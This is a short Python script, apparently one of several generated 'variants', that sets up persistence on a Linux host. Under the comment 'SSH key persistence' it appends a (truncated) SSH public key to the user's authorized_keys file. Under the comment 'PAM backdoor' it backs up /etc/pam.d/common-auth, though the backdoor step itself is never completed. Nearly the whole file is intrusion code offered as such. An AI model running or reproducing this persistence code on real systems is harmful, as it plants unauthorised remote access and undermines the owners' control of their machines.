# Variant 1 - Generated at 2026-03-30T08:16:36.486305

import os
import shutil

# SSH key persistence
ssh_dir = os.path.expanduser("~/.ssh")
os.makedirs(ssh_dir, exist_ok=True)
with open(os.path.join(ssh_dir, "authorized_keys"), "a") as f:
    f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...")

# PAM backdoor
shutil.copy("/etc/pam.d/common-auth", "/etc/pam.d/common-auth.bak")
